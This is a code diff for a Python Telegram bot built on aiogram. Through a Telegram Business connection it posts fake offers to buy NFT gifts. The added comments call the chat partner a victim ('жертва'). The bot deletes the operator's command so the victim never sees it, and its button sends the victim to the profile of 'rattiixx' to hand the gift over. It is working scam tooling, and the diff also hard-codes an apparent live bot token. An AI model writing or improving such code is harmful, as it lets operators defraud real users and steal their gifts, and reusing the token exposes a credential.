@@ -11,6 +11,7 @@ from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton
 )
 
+# --- НАСТРОЙКИ ---
 TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
 TARGET_USERNAME = "rattiixx"
 CURRENCY = {"g": "💎", "s": "⭐"}
@@ -28,21 +29,18 @@ def offer_kb(oid: str) -> InlineKeyboardMarkup:
     ]])
 
 def instruction_kb() -> InlineKeyboardMarkup:
-    # Ссылка на профиль (через tg://resolve с параметром profile)
-    # Примечание: в вебе это может открыть чат, но в приложении — профиль.
-    # Более надежный вариант для открытия именно профиля в приложении:
-    target_url = f"tg://resolve?domain={TARGET_USERNAME}"
-    
-    # Если tg:// не срабатывает в веб-версии, можно использовать:
-    # target_url = f"https://t.me/{TARGET_USERNAME}?profile"
+    # Ссылка ведет ИМЕННО на профиль, а не в чат
+    target_url = f"https://t.me/{TARGET_USERNAME}?profile"
     
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 Передать подарок", url=target_url)],
         [InlineKeyboardButton(text="✅ Подарок передан", callback_data="done")],
     ])
 
+# Слушаем бизнес-сообщения (автоматизация)
 @dp.business_message(Command("offer"))
 async def cmd_offer_business(message: Message):
+    # Разбиваем текст по пробелам (без кавычек)
     parts = message.text.split()
     
     if len(parts) < 4:
@@ -55,7 +53,7 @@ async def cmd_offer_business(message: Message):
     url, raw_sum, cur_key = parts[1], parts[2], parts[3].lower()
     
     if not url.startswith("https://t.me/nft/"):
-        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок.")
+        return await message.answer("Ошибка: Ссылка должна быть на NFT-подарок (начинаться с https://t.me/nft/).")
         
     if cur_key not in CURRENCY:
         return await message.answer("Валюта только <b>g</b> или <b>s</b>.")
@@ -72,14 +70,16 @@ async def cmd_offer_business(message: Message):
         f"{url}"
     )
 
+    # Удаляем команду из чата с жертвой
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
             message_ids=[message.message_id]
         )
     except Exception as e:
-        logging.error(f"Не удалось удалить: {e}")
+        logging.error(f"Не удалось удалить сообщение: {e}")
 
+    # Отправляем оффер с превью NFT
     await message.answer(
         text=caption,
         reply_markup=offer_kb(oid),
@@ -113,6 +113,7 @@ async def on_done(call: CallbackQuery):
 
 async def main():
     logging.basicConfig(level=logging.INFO)
+    print("Бот запущен и ожидает сообщения...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
